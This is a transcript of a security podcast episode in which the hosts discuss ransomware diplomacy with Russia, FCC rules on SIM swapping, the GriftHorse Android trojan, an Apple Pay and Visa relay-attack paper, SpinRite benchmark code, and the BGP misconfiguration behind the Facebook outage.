So I guess, you know, you poke the bear enough, and it rouses.  As we know, last May was the attack against Colonial Pipeline, which resulted in fuel shortages across the U.S. East Coast.  The next month, in June, the attack on JBS Foods disturbed the supply of meat across the U.S.  Don't mess with the bear's meat supply.  And then in July the massive series of attacks which leveraged flaws in Kaseya's IT management servers, which as we well know created disruptions at hundreds of companies across the U.S. and more than 1,500 globally.  So we're told that President Biden first raised the issue of ransomware attacks carried out from within Russia's borders with Putin during a face-to-face meeting last June, and that he again raised the issue in a phone call in early July.  Presumably he's supposed to have a great relationship with Putin.  So saying, look, crack down on gangs operating in Russia.  You're really pissing us off over here.



And now we know that, if that was done, what actually transpired remains unknown, but it apparently didn't last very long since multiple attacks resumed last month.  And this did lead the FBI to formally conclude that they saw "no indication" that Russian officials had actually taken any effort to crack down on these groups.  As we talked about, what, I guess when these attacks resumed, it looked like maybe they'd taken a vacation.  And they said, you know, everybody needs a little time off.  We're back.  Wonderful.



So there are a number of big, significant, and very interesting macro trends taking shape.  What governments ultimately decide to do about encryption that they cannot crack is another one.  So it's going to be very interesting to see how this all plays out.  We actually do appear to be entering a period of true inter-nation economic cyberwarfare.  And that idea, as I said, still startles and unsettles me.  I don't want it to be true.  But it seems to be becoming so.



On the topic of thwarting SIM-swapping attacks, as we know, I titled our August 31st podcast "Life: Hanging by a PIN."  And I know from the much greater than average level of feedback I received that my painting a clear picture of just how vulnerable we would typically be if our smartphone number were to fall into the hands of an attacker, that a greater awareness of the trouble did hit home with our listeners.  So I was interested to see, and I was initially hopeful, and I wanted all of our listeners to know that at least some of the U.S. bureaucracy is awake to this threat and is beginning to move on it.  The bad news is that the specific arm of the U.S. bureaucracy is the FCC.



Last Thursday the FCC, of course our Federal Communications Commission, announced its plans to introduce new rules for U.S. mobile carriers to govern any changes made to their subscribers' telephone numbers in an attempt to address the growing problem of SIM swapping and port-out fraud attacks.  Okay, that sounds great; right?  Of course, as we know, these attacks surround mobile carriers' failure to correctly verify the requesting party's identity when that party requests either that their service be transferred to a new SIM card, or to an account at another mobile operator.  That podcast #834 painted a very clear and depressing picture of just how much devastation could result.



The U.S. Justice Department has charged many individuals over the past few years with theft enabled by SIM swapping and port-out fraud.  And some of the victims of these thefts have, understandably, brought lawsuits against their mobile carriers in an attempt to recover their monetary losses.  Many of those lawsuits are still working their way through the U.S.'s delay-prone legal system, so no conclusions to those yet.



In response to the problems, some U.S. carriers have introduced additional verification measures to attempt to limit this sort of fraud, but the SIM-swapping gangs have also upped their game.  Some groups have started bribing carrier employees, or they've used vulnerabilities they've identified in the carriers' networked backend systems to perform the attacks for them, thus skipping the need to have any direct contact, and trick the carriers' frontend support staff.



In its press release Thursday, the FCC announced that in response to having received "numerous complaints from customers" - I'll bet - that it's initiating a "formal rulemaking process" by issuing a "Notice of Proposed Rulemaking."  Okay.  These are the same people who said they were going to outlaw and prevent telephone spam.  So I think this means that it's still going to be up to us to protect ourselves.



An FCC spokesperson told "The Record," who reported on this issue, that:  "The FCC's rulemaking process generally starts with a Notice of Proposed Rulemaking that asks questions and makes proposals.  We then have a period during which we take public comments, generally made through our Electronic Comment Filing System."



LEO:  Which as we know in the past...



STEVE:  Exactly.



LEO:  ...has been somewhat unreliable.



STEVE:  Just to remind everyone, that's the ineptly designed system that was brutally spammed during their Net Neutrality Request for Comments period, you know, during which more people than exist on Planet Earth weighed in with their opinion about Net Neutrality.  Anyway, they concluded:  "After that, we review comments before taking any next steps."  Because, oh, goodness, we would not want the FCC to act prematurely on our behalf of securing our SIMs and require them to be more secure before allowing them to be moved.  So although I wrote about the fact that some of the U.S. bureaucracy is awake to this threat and is beginning to move on it, unfortunately that bureaucracy is the FCC.  And I have a friend who's...



LEO:  Really wants to talk to you, yes.



STEVE:  He's having his home repiped, and that's quite an adventure.



LEO:  Oh, my.



STEVE:  So I'm getting pipe-by-pipe updates.



LEO:  Well, they've put in the drain pipe now.  Wow.



STEVE:  Yeah.  His house, well, his house was built in '84, and he's beginning to have pinhole leaks.



LEO:  Oh.



STEVE:  Apparently as a consequence of Southern California water, which by the way is why I'm on the other side of a quad-filter reverse-osmosis filter.  It is undrinkable down here in Southern California.  



LEO:  Plus you steal it from us.



STEVE:  Leo, remember when...



LEO:  We poison it before we send it to you.



STEVE:  Yeah.  Remember when we were growing up you'd have the hose on, like on a hot Saturday afternoon.



LEO:  You'd drink from that.



STEVE:  You just slurped.



LEO:  So good.  So good.



STEVE:  Oh, my god.  It was.  What happened?



LEO:  But see, you were up here in Northern California.  The water was better in San Mateo back in those days.  San Francisco has very pristine water.



STEVE:  Even now you can drink it?



LEO:  Yeah, it's from the Hetch Hetchy.  So it's, yeah, it's good.  I'm not sure where L.A. gets its water.  But I'm not surprised it's not good.



STEVE:  Comes out in the sewer system, I think.  Right now really you don't want to be getting it out of the ocean, lord knows.



LEO:  No.



STEVE:  Because we've got a big oil spill down here.



LEO:  Yeah, right off the coast, right where you are, yeah.



STEVE:  Don't I remember, are you using well water?



LEO:  We have a well.  And we, like you, have a significant amount of filtration.  We have softening because there's a lot of iron in it, and then it goes from the softening, and the drinking water specifically is reverse-osmosis and charcoal filtered, yeah.  It's delicious, though.  By the time it's done, man, that's good.  It's kind of like getting a hose in your backyard, out of the backyard.  All right.  We were going to take a break, I think, yes?



STEVE:  Yes, we are.



LEO:  And then we will talk about a new Android trojan.



STEVE:  Ooh.



LEO:  Ooh.  And of course the Facebook story coming up.



STEVE:  And Leo, you probably haven't scrolled ahead, but I just, to be a little more punchy, I wanted to list the number of apps which were found with that trojan.  So just prepare yourself.



LEO:  Oh, it's a long list.  I shall scroll through them.  Holy cow.  Wow.  Malware on the Android again.



STEVE:  Yeah.  I don't talk about Android a lot because, well, there's just a lot to talk about.  Zimperium, the research group that we've often referred to, recently revealed their research into one of the best-named Android malware campaigns I've seen in a long time.  So it's a trojan.  So we have a horse.  And it signs its victims up to high-cost services to reap the rewards.  So they named it GriftHorse.



LEO:  I get it.



STEVE:  It's just perfect.



LEO:  Don't look it in the mouth.



STEVE:  Don't look that GriftHorse in the mouth.  That's right.  So but what caught my eye was the tremendous number of apps, the tremendous effort that had gone into the creation of GriftHorse's, count 'em, 139 individually created and infected with a trojan app.  Some of them do what they say they're going to do.  Some of them don't do anything.  But there's just a ton of them.  And in fact a total infection base of greater...



LEO:  Now, some of these were not created by the virus, like Forza H or TrueCaller.  So there must be a library they're using or something.



STEVE:  Right, right.



LEO:  Because some of these are legit apps.  That's what's really scary.  These are not...



STEVE:  Exactly.  



LEO:  ...just throwaway apps.



STEVE:  Right.  And like Handy Translator Pro, there were a million downloads of that.



LEO:  Yeah.  Oh, this is fascinating.



STEVE:  So Zimperium explained, they said:  "The threat actors have exerted substantial effort to maximize their presence in the Android ecosystem through a large number of applications, developer accounts, and domains.  The Zimperium zLabs researchers have noticed the technique of abusing cross-platform development frameworks to stay undetected has been on the rise, making it more difficult for legacy mobile AV providers to detect and protect their customers.



"The timeline of the threat group dates back to November 2020, suggesting that their patience and persistence will probably not come to an end with the closing down of this one campaign.  The threat to Android users will always be present, considering the innovative approaches used by malicious actors to infect the victims."  They finish:  "The numerical stats reveal that more than 10 million Android users fell victim to this campaign globally, suffering financial losses while the threat group grew wealthier and motivated with time.  And while the victims struggle to get their money back" - often not possible, as we'll see in a second - "the cybercriminals made off with millions" - actually hundreds of millions - "of euros through this technically novel and effective Trojan campaign."



So just to give people, you know, instead of saying, oh, yeah, there's a lot of them, I grabbed the list and formatted it for the show notes.  I mean, it's just like it's a Who's Who.  And they estimate as many as 17,345,450 downloads spread across this 390 Android apps.  So they summed up their position on this by writing:  "These mobile applications pose a threat to all Android devices by functioning as a trojan that subscribes unsuspecting users to paid services, charging a premium amounting to around 36 Euros per month, which is about $42.  The campaign has targeted millions of users from over 70" - seven zero - "countries by serving selective malicious pages to users based on the geolocation of their IP address with the local language.  This social engineering trick," they write, "is exceptionally successful, considering users might feel more comfortable sharing information to a website in their local language.



"Upon infection, the victim is bombarded with alerts on the screen letting them know they had won a prize and needed to claim it immediately.  These pop-ups appear no less than five times per hour, until the application user successfully accepts the offer."  Just to shut it up.  "Upon accepting the invitation for the prize, the malware redirects the victim to a geo-specific web page where they are asked to submit their phone number for verification.  But in reality they are submitting their phone number to a premium SMS service that would start charging their phone bill over 30 euros per month.  The victim does not immediately notice the impact of the theft, and the likelihood of it continuing for months before detection is high, with little to no recourse to get one's money back.



"These cybercriminals took great care not to get caught by malware researchers by avoiding hard-coding URLs or reusing the same domains and filtering/serving the malicious payload based on the originating IP address's geolocation.  This method allowed the attackers to target different countries in different ways.  This check on the server side evades dynamic analysis, checking for network communication and behavior.  Overall, GriftHorse Android Trojan takes advantage of small screens, local trust, and misinformation to trick users into downloading and installing these trojans, as well as frustration or curiosity when finally accepting the fake free prize spammed into their notification screens."



So I wanted to put this particular campaign on our listeners' radar because, just as when we first talked about ransomware many years ago, and I commented then that it felt to me as though it was really going to become a problem in the future, this feels the same way.  The trouble is that the attackers behind this were known to be netting several million dollars per month.  And this creates a lot of motivation.  And many of the new facets of this approach have been proven to be surprisingly successful now.  So it's not like they tried it, and it didn't work.  They tried it, and it did work.



And unlike a single ransomware attack which inherently creates a single point of failure for the attacker if their victim chooses not to comply, even in the face of all the threats and extortion and threats to disclose information and everything, in this model the individual damages in this attack are small, they're incremental, and widely dispersed across 70 countries and 10 million individuals in many languages.  So they individually slip under the radar by siphoning a small cash flow from many millions of individuals who are end users.  And in the process they create what amounts to a stable cash flow of illicit funds for the bad guys.



This GriftHorse campaign not only managed to fly under the radar and to avoid AV detection for many months, like starting back in November, and it just now came to light, it likely surpassed hundreds of millions of dollars in total amount plundered from its victims until Zimperium responsibly notified Google of their discovery, and Google immediately purged those identified apps from the Play Store.  But even so, those apps continue to be available on untrusted third-party app repositories, which again underscores for us the risks associated with side-loading arbitrary apps from untrusted sources.  So I'm afraid that we can expect to see more of this style of attack in the future, probably on the Android platform, since it's where it makes the most sense.



Over on the Apple side, there's a problem that's been identified with Apple Pay.



LEO:  In case you Apple people feel smug and safe.



STEVE:  That's right.  Before you go, "Huh."



LEO:  So there.



STEVE:  We've got a problem with Apple Pay and Visa.  And disturbingly, both companies have been informed, but neither has chosen to fix the problem because they're arguing over whose fault it is.  Even though either one of them could mitigate the trouble at their end.  So a handful of researchers at the University of Birmingham and the University of Surrey, both in the U.K., have written up their research in a paper which will participate in the 2022 - wow, Leo, that's coming up before we know it, 2022 - IEEE Symposium on Security and Privacy.



Okay, now, their paper's abstract suggests that maybe they've been spending a little too much time in the lab.  They should get out more.  They explain rather densely:  "Relay attackers" - meaning man-in-the-middle, man-in-the-middle relay attackers - "can forward messages between a contactless EMV bank card and a shop reader, making it possible to wirelessly pickpocket money.  To protect against this, Apple Pay requires a user's fingerprint or Face ID to authorize payments, while Mastercard and Visa have proposed protocols to stop such relay attacks.  We investigate transport payment modes and find that we can build on relaying to bypass the Apple Pay lockscreen, and illicitly pay from a locked iPhone to an EMV reader, for any amount, without user authorization."  Gulp.



"We show that Visa's proposed relay countermeasure can be bypassed using rooted smartphones.  We analyze Mastercard's relay protection and show that its timing bounds could be more reliably imposed at the lower protocol level, rather than at the EMV protocol level.  With these insights, we propose a new relay-resistance protocol" - they call it the L1RP - "for EMV.  We use the Tamarin prover" - that's something we talked about back when we were talking about all of this, the idea of doing robust proof using a formal proof technology, that's this Tamarin prover - "to model mobile phone payments with and without user authentication, and in different payment modes.  We formally verify solutions to our attack suggested by Apple and Visa and used by Samsung, and we verify that our proposed protocol provides protection" - oh, there we go, proposed protocol provides protection - "from relay attacks."



Okay.  So what does this mean practically?  Elsewhere, they make this more clear, explaining:  "Contactless Europay, Mastercard, and Visa," thus EMV payments, they say, "are a fast and easy way to make payments that are increasingly becoming a standard way to pay.  However, if payments can be made with no user input, this increases the attack surface for adversaries and especially for relay attackers, who can ferry messages between cards and readers without the owner's knowledge, thus enabling fraudulent payments.  Payments via smartphone apps generally have to be confirmed by a user via a fingerprint, a PIN code, or a Face ID.  This makes relay attacks less of a threat.



"However, Apple Pay introduced the Express Transit/Travel feature in May of 2019 which allows Apple Pay to be used at a transport-ticketing barrier station without unlocking the phone, for usability convenience.  We show that this feature can be leveraged to bypass the Apple Pay lockscreen and illicitly pay from a locked iPhone, using a Visa card, to any EMV reader, for any amount, without user authorization.  Furthermore, Visa has proposed a protocol to stop such relay attacks for cards.  We show that Visa's proposed relay countermeasure can be bypassed using a pair of NFC-enabled Android smartphones, one of which is rooted."



Okay.  So here's the bottom line.  The Apple Pay lockscreen can be bypassed for any iPhone with a Visa card set up in transit mode.  The contactless limit can be bypassed allowing unlimited amount EMV contactless transactions originating from that locked iPhone.  An attacker only needs remote access, a powered-on iPhone, stolen, in a handbag or in a pocket.  It does not need to be unlocked.  The transactions can also be relayed from an iPhone inside someone's handbag or pocket, as I said, without their knowledge, and the attacker needs no assistance from the merchant.  So no clicks anywhere.



Backend fraud detection checks have not stopped any of their test payments.  They did a 1,000 euro transaction, no red flags, no alarms.  It went through.  So just to be clear, this attack is made possible by a combination of flaws in both Apple Pay and in Visa's system.  It does not, for instance, affect Mastercard on Apple Pay or Visa on Samsung.  You've got to have Apple Pay and Visa both.  Their research provides formal modeling that shows that either Apple or Visa could mitigate this attack on their own.  As I noted above, both companies have been informed months ago, yet neither have fixed their system.  So the vulnerability remains live and workable today.  The researchers recommend that all iPhone users check that they do not have a Visa card set up in transit mode.  And if they do, it would need to be disabled to prevent this attack from succeeding against that phone and that card.



So it's not that it's not going to happen, but it could.  Right?  I mean, so it seems like I don't use my iPhone.  I do have a Visa card.  Yeah, I do.



LEO:  I'm sure you don't have transit mode turned on because there's no subways in Irvine.



STEVE:  Exactly.



LEO:  Or maybe you take the bus.  Do you take the bus, Steve?



STEVE:  No.  I don't.



LEO:  I don't see you in a bus on your way to Starbucks.



STEVE:  Hopefully, Apple will get some flak now that this research is public, and they'll fix this.



LEO:  They're blaming Visa, though.  They say, well, it's not our problem.  It's a bug in Visa's stuff.



STEVE:  I know.  And here we have another instance of Apple only fixing something when someone makes them.  And even then, it's like saying no, no, pointing the finger at them.  The researchers make it clear, Apple could fix this if they chose.  But no.  And that's disappointing.



LEO:  Yeah.



STEVE:  Just a quick update on "Foundation."  You and I chatted about it briefly before we began recording, Leo.  In my opinion, no improvement after the third show, third episode.  It's just not fun.  You know, it's not exciting.  It's slow and heavy and boring.  And, you know, so I'm hoping that when hostile aliens invade the Earth this Friday on Apple's new series "Invasion," which begins on Friday, that that will provide some much-needed sci-fi excitement.  Because there's no excitement coming from "Foundation."  Wow.



LEO:  Yeah, yeah.  That's too bad.  I hope "Invasion" will be good, too.



STEVE:  And I heard you ask Alex what he imagined this cost them to produce.



LEO:  Yeah.  Did you hear?



STEVE:  Yeah.  Tens of millions of dollars for an episode.



LEO:  He said 50.  He said 50, which is, like, movie money.  $50 million an hour, that's how much a - I can't believe it'd be that much.  But maybe it is.  15 million was "The Morning Show," and that didn't have aliens.  Not that aliens are necessarily more expensive.  Just a little rubber makeup and...



STEVE:  I was trying - yeah.



LEO:  They didn't have spaceships.  Now, they're expensive.



STEVE:  Matt Kopit tweeted to me:  "Regarding the sound quality on 'Foundation,' I noticed the same thing with muddled dialogue, and found that disabling Dolby Atmos in my Apple TV's audio settings improved things dramatically.  Your mileage may vary, but feel free to give it a try."



LEO:  That makes sense.  That might make sense, yeah.



STEVE:  So that's worth considering.



LEO:  I didn't notice any problem on my stereo speakers.  So maybe that is the case.  So it's been Dolby that's the problem, yeah.



STEVE:  Yeah.  Over the weekend I posted an update to the patient gang who's been waiting to test and pound on the next release of what...



LEO:  And they responded back, apparently.



STEVE:  Who will be pounding on the next release of what will become, as we know, SpinRite v6.1.  I explained that I had reached the point where, as far as I can tell, everything is working.  I tracked down a problem with the non-DMA IDE driver, and I made the BIOS associator a bit more bulletproof.  I had previously invested a bunch of time updating SpinRite's original benchmarking code for 16 bits' worth of sectors.  That is, it used to be able to do 32 bits, no drives back in 2004 were even close to 32 bits' worth of sectors.



Of course now we know that, what is it, 2.2, 2.3TB, and drives are bigger than that now.  So we've added another 32.  Actually, we added another 16 bits, so they're 48 bits.  But I figured, well, I'm doing 48, let's get ahead of the curve for a change.  I'll do 64.  But really that'll take care of us for a long time, literally until the aliens have come and gone.  But I hate the way the benchmark is working, and I've decided to scrap it and rework it now since I can't live with it.



The trouble is that the only timing reference the original SpinRite had was the PC's counter/timer which is a 16-bit counter/timer that runs at 1.193 MHz, which is one count every 838 nanoseconds.  The counter/timer is still there, and that's plenty of resolution.  But the counter/timer chip was a ripple-counter which could sometimes be sampled and caught mid-count, or mid-ripple, which would produce a false count result.  The chip did have a latching function, but I encountered some that still produced bogus results.  So I developed a sanity filter that would take three successive readings from the counter, and SpinRite would only believe the final one if each of the previous two readings showed the same count or one that was increasing.  And the filter also had to be smart about the 16-bit counter's wraparound since that happened 18.2 times per second.  If the filter thought that it had obtained a mid-count reading, it would just start over.



The point is that, back then, that's all I had.  So that's what I had to use.  Today's RDTSC, which is the read timestamp counter instruction, did not exist as it does now.  My new code, the code I've already written for the ReadSpeed benchmark, uses the RDTSC instruction for various delays it needs when waiting for hardware to settle, like down in the nanoseconds range, for hardware to settle, and for all of its benchmark performance measurements.  But SpinRite had not been using it for the benchmark timing since I was trying to minimize the rewriting.  And I figured that what SpinRite was already doing was fine.  But I had to go back into that old code to make sure it would work, and I saw just how horrendous it was.



So I need to rip it out and replace it with the newer code that I have already developed for the ReadSpeed benchmark.  Although it doesn't technically need it, SpinRite will be needing the new system's insane picosecond resolution in the future, and 6.1's code will be surviving for years.  So now is the time.  I've already worked out all the details for ReadSpeed, and I have all the formatting and everything ready to go.  So it's just a matter of removing the old bad code and moving the newly written good code over.  Once that's done, I'll be glad that I did.  And that will be Release 4 of the pre-release of SpinRite, which the gang will pound on while I'm working on finishing up the rewrites of the data recovery portion.  And then it's going to be ready for use.  So we're getting there.



LEO:  Excellent.  Excellent.  Well done.  I can't wait.  And it just shows, you know, you don't settle.  You just don't settle.



STEVE:  I try to, but I...



LEO:  You can't.  Your name's on it.  It's going to reflect you.  And given how long - how long ago did System 6 come out?  SpinRite 6?



STEVE:  '04.  17.



LEO:  '04.  So given that this is - it's going to be like another while.  You don't want it to be not perfect.  Right?



STEVE:  I want it to be... 



LEO:  17 years, wow.



STEVE:  Although the truth is, because we are connected now the way we weren't then, you know, back then I was arguing with Egghead about why they were returning boxes of SpinRite that were fine.  It's like, whoa, we have a return policy that lets anyone return anything they want at any time.  I said, well, you realize that they bought it, they took it home, they fixed their hard drive, and they brought it back to you.  And you've sent it back to me.  Anyway, the point is I'm much happier with the way the world is today, 17 years later.  And Egghead is gone, and sorry.



LEO:  How much, by the way, out of curiosity, how much of the retail price did Egghead keep?  50%?



STEVE:  I think they got 30 because they - but they didn't buy direct.  They had to buy through Softsell.  And Softsell got 50 plus marketing - oh, excuse me.  Did I just say that?



LEO:  Let your feelings out, Steve.  It's good for you.  You don't want to...



STEVE:  Leo, it was so frustrating working through distribution because we would send the stuff off.  Remember we had like bound manuals with spiral binding. 



LEO:  It's expensive, yeah.



STEVE:  Both the 5.25 and the 3.5" disk sizes.  And a registration card.  This whole beautiful box, all color printed.  They'd go off in big shipments, and then half of them would come back damaged.  They looked like elephants had trodden on them.  Of course, so they would deduct that.  And then it was supposed to be net 60, and I had two people working full-time just to get us paid through, first it was Softsell and then Ingram Micro.  We had a couple of the big distributors that were doing all of that.  And so I'd end up waiting half a year to get my money.



Which, you know, meanwhile they had the product.  The customers had it.  Everyone loved it.  But I wasn't getting paid.  So I remember just swearing to myself, the instant I can cut these people out of this, I will.  And thank god for the Internet because it's allowed me to work directly with my end-user customers, and things are much better.



LEO:  The reason I ask is when people complain about Apple's 30%, that's nothing compared to the 50% taken by the distributor, Softsell or Ingram or whoever that was.  And then you only get 70% of the 50%, minus marketing, before, you know...



STEVE:  So I did not have a zero cost, either.



LEO:  Right.



STEVE:  With everything being an electronic download, the publisher really, it's like they're complaining that they're losing 30%, but they have zero cost.



LEO:  Right.  No download cost.  No manual cost.



STEVE:  Duplicating diskettes and stuffing all this and shrink wrapping everything.



LEO:  You maybe, if you were lucky, took 10-20% of the selling price as profit.  I mean, 70% is pretty damn good, I mean, compared to what it was back in the day.



STEVE:  Yeah.



LEO:  All right.  Take a little break.  When we come back, we will look at the Facebook - people just joining us saying, "Did he talk about Facebook yet?"  No, he didn't.  It's coming up next.  Steve Gibson.



STEVE:  Because you know, Leo, something went wrong.



LEO:  I hear.  I hear that.  That's the name of our show.



STEVE:  Not good.



LEO:  Facebook.  Sorry.  Something went wrong.



STEVE:  Something went wrong.  I love the screen that came up because it says "We're working on it."  Well, first it says "Sorry, something went wrong.  We're working on it, and we'll get it fixed as soon as we can."  And then there's a link, "Go back."  So, like...



LEO:  Was the image broken, too?  That's the other thing I love.



STEVE:  Yes.



LEO:  Something went wrong.  We couldn't even give you an image.  Sorry.  We don't even have that.



STEVE:  Don't even know what that - I would love to know what that was of.  But you can't see it now.  And I love it because then of course they added their copyright.  Facebook copyright 2020.



LEO:  Oh, whoops. 



STEVE:  Yes.



LEO:  They couldn't even update this.  They were so out of luck.



STEVE:  Yeah.  Okay.  So the Internet's big iron routers are connected to each other by their peering interface links.  For example, if you had a piece of paper covered with a bunch of circles representing routers, then drew straight lines between each of the circles close to other circles, those straight lines linking circles would be peering links.  Those peering links carry the low-level packet traffic which routers route.  And the routers also use those same links to maintain persistent TCP connections over which the BGP protocol flows.  BGP, the Border Gateway Protocol, is a TCP-hosted protocol like HTTP, FTP, SMTP.



But in this case BGP is a peering protocol exclusively used by routers to talk to each other, specifically to talk to their immediately adjacent connected neighbors.  The conversation they have has the purpose of synchronizing their respective routing tables with each other, with the routers to which they peer.  Which is to say to which they are directly connected.  When a router receives a change to its own routing table, either introduced by a local admin or received from another router peer, it updates its own table appropriately to reflect the changes, then sends news of those changes which it has just made to its table to its other peers so that they, too, might make any needed adjustments.



Now, a large enterprise which has its own Autonomous System number, AS as it's called - Facebook's AS is 32934 - will use their large backbone routers to connect their public enterprise network to the rest of the public Internet.  Their routers will know which IP ranges belong to its enterprise owner, and will contain entries in its routing table to route traffic bound for those IP ranges to the enterprise's router interfaces.



And since every such router shares its routing table with its peers over BGP, all of its peering routers will also know that any traffic they receive for those IPs should be forwarded to that Autonomous System router.  And since those routers also share their routing tables with their peers, all of the routers they connect to will also know.  And so it goes, over and over, peer by peer, until every big router on the Internet knows where to send traffic that's bound for any of that enterprise's IP ranges.



In the weird parlance of BGP routing, we say that the original router is "advertising" the routes which it alone is able to handle by forwarding any incoming traffic to its Internet-connected enterprise.  So it advertises the routes for the traffic it should receive.  



So yesterday, at 11:39 a.m. Eastern Time, shortly before noon (15:39 UTC), someone at Facebook updated the routing information for Facebook's networks to something that no longer worked.  Even now, following Facebook's official post-recovery blog posting, they're not telling the world exactly what happened.  Initial reports suggested that it might only be the routing to Facebook's four authoritative DNS servers, which are a, b, c, and d dot ns, as in name server, a, b, c, and d.ns.facebook.com, that may have been messed up to render those crucial servers unavailable.  But some additional evidence suggests that the trouble was much bigger than that.



The reports of a DNS-based failure came from those whose own DNS servers suddenly started returning SERVFAIL errors, indicating that none of those four authoritative Facebook DNS servers responsible for Facebook.com were replying to their queries. Presumably, those four authoritative Facebook DNS servers were still up, but they had just become unreachable due to a routing error.  The reason I believed that DNS was only part of a much bigger, probably network-wide all-of-Facebook problem, was that, as shown in the diagram I have in the show notes traffic being served by Facebook dropped like a rock off a cliff.



And in the show notes I have this chart which shows the moment this happened, and traffic just collapsed.  It went from near its peak around noon on the East Coast, which because there is sort of a sinusoidal traffic pattern that we see from domestic-based companies.  It just over the course of about five minutes just went to zero.



So as we know, DNS caches.  And caching is a core feature of DNS.  If this were "just," and I have that in air quotes, a major DNS outage, we would expect to see a far more gradual reduction in traffic to Facebook over a span of hours, rather than minutes, as the Internet's massively dispersed and distributed DNS caches which exist at every level, even right down to the individual end-user smartphone and desktop PC.  As those individual cache entries independently expired, their own local DNS would only then go in search of an IP address to update.  And only when an expired entry could not be updated would the user's local machine report that Facebook had become unavailable; or, as their copyrighted page wonderfully stated, "Something went wrong."



Yesterday, during the outage, just like the rest of the world, I was unable to query Facebook's authoritative DNS servers.  So I was unable to obtain the details of how Facebook had set up their DNS.  But this morning, with Facebook back on the air, we can more closely examine the way they have their DNS configured.  I used NSLOOKUP to pull the SOA, which is the Start Of Authority, DNS record directly from one of Facebook's authoritative DNS servers:  a.ns.facebook.com.  Here's what I received.  In the show notes I have a picture of the output of NSLOOKUP, which I had configured to do a query type of SOA.



And I queried Facebook.com using the server a.ns.facebook.com.  And what we get back is a couple of - both an IPv6 and an IPv4 address.  And then the Start of Authority record which shows the serial number for that record; the refresh interval in seconds, which is 14,400, which is four hours; the retry interval, 1,800, which is 30 minutes; the expiration, which has 604,800 seconds, in other words, seven days; and the default TTL, the time to live for this record, which is 300 seconds, or five minutes.



The last two items there tell the story, the record expiration time and the default TTL.  Facebook's default TTL for their DNS records is only five minutes.



LEO:  That's pretty short; right?



STEVE:  That's very short.



LEO:  Yeah.



STEVE:  This means that, unless it's been overridden by a per-record TTL,  and Facebook's A and AAAA records for its IPv4 and IPv6 IPs are not overridden, that means that once every five minutes, every DNS client on the planet will see that its local cached copy of Facebook's IP address has reached its end of life and should be re-fetched from that client's configured DNS server.  But if that update query fails, what happens?  That's where the SOA's specified record expiration time keeps you from being SOL.  Although Facebook uses a short TTL, they also use an expiration of seven days.  And that will be seven days from the most recent previous successful update, which would have been within the past five minutes.



This means that even if Facebook's DNS had dropped off the face of the Earth, so long as the rest of Facebook was still present, clients on the planet would have happily continued using Facebook for the next week while their DNS patiently and periodically attempted to check in for a DNS update.  I figure that they have such a short TTL as part of their load balancing because the servers are able to decide which IPs they want to give out.  Typically they have huge banks of IPs.  And by asking clients to come back to the trough for another IP every five minutes, that allows Facebook to dynamically decide which IPs they want to send where.  But again, in the event that there's no IP available, all the clients have been told you can keep using what you have for a week.



So in other words, all of the evidence points to this being a massive whole-of-Facebook Internet outage, an Internet routing error.  Add to that the fact that Facebook's Instagram service also disappeared from the Internet, despite the fact that Instagram's DNS is hosted by Amazon, not Facebook, and Amazon didn't have a problem.  So this wasn't about just DNS.  As we know, DNS caches.  But what doesn't cache is BGP.  If someone at Facebook made the colossal mistake of deleting all of Facebook's routes from the Internet, that change would have propagated at the speed of the Internet.  And within a few minutes, just as we saw from that sheer Internet traffic cliff, no Internet backbone routers anywhere in the world would have had any idea what to do with a Facebook IP address, even though all of those users would have still had them cached for the next week.



Since BGP is just a protocol like any other, anyone with access to Autonomous System level routers which peer with each other, or is on the inside of internetwork operations, can monitor BGP traffic and activity directly.  And Monday afternoon Cloudflare was doing just that.  In the show notes again, I have a strip, a diagram.  The chart shows a 30-minute graph taken from 15:30 to 16:00 UTC, of Facebook-related BGP traffic.  Normally there's nothing happening since routing tends to be boring, except when it's not.  And there was nothing boring about routing yesterday.



The chart shows that starting at exactly 15:39, in the darker blue trace, some new routes were announced, and a bit later there was a similar volume of routes withdrawn.  That's in the lighter blue.  It may have been that that was deliberate because it looks like things were being moved around.  But then, about a minute and a half later, we see a massive flurry of routes being withdrawn in the lighter blue, where the area under the curve dwarfs that of any new replacement announcements.  Now, maybe it was supposed to be that way.  The goal may have been to consolidate routes, which is much better for routing efficiency.  In that case you would expect to see many more withdrawals than new announcements to replace them.  Except that we also know that the result of this sudden flurry of activity was a catastrophe.  So it really looks like a mistake.



LEO:  There's actually a secondary post which I'll - I don't want to interrupt your flow.  But at the end, Facebook has posted in much more detail about what happened.  I think they now know what happened.  But go ahead because I want you to speculate, and then you'll see you're actually pretty right-on.



STEVE:  Okay.  And I wrote here, by now Facebook certainly knows precisely what happened.  But based upon their public statement, once this had all been resolved, it doesn't appear as though we're going to get much clarity from them unless it eventually leaks out.  But what they did say confirms our hypothesis from the evidence.  So what they posted first is, they wrote:  "To all the people and businesses around the world who depend upon us, we are sorry for the inconvenience caused by today's outage across our platforms.  We've been working as hard as we can to restore access, and our systems are now back up and running.  The underlying cause of this outage also impacted many of the internal tools and systems we use in our day-to-day operations, complicating our attempts to quickly diagnose and resolve the problem.



"Our engineering teams have learned that configuration changes on the backbone routers that coordinate network traffic between our data centers caused issues that interrupted this communication.  This disruption to network traffic had a cascading effect on the way our data centers communicate, bringing our services to a halt."  Now, of course that's a very generic way of saying what we just talked about.  They said:  "Our services are now back online, and we're actively working to fully return them to regular operations.  We want to make clear at this time we believe the root cause of this outage was a faulty configuration change.  We also have no evidence that user data was compromised as a result of this downtime," blah blah blah.  And we apologize and so forth.



Okay.  So what was most curious, and really sort of unbelievable while this was all happening, was that Facebook didn't quickly pop back up on the air.  When I learned that they were down, I was thinking, okay, this won't take long.  You know?  If someone had entered a bad routing update, how difficult could it be to at least roll back the change?  As it happens, while this was going on, I was already at work on this podcast, so I was able to participate in the drama with my followers on Twitter.



My first tweet read:  "Facebook may have 'deplatformed' itself, along with Instagram and WhatsApp.  Hope no one depends upon 'Login with Facebook!'  Whoopsie!  Somehow, the BGP entries for Facebook's DNS resolvers have been withdrawn from the Internet's routing tables.  Insider?  Attack?  Who knows.  Wow."



After a bit more digging I added:  "Someone on the Facebook recovery effort has explained that a routine BGP update went wrong, which in turn locked out those with remote access who could reverse the mistake.  Those who do have physical access do not have authorization on the servers.  Catch-22."  So anyway, so we were beginning to get some clarification at that point of the trouble.  And apparently the unexpected loss of Internet routing had cut off their own engineers from the routers they needed to access in order to roll back the changes.  Again, whoopsie.



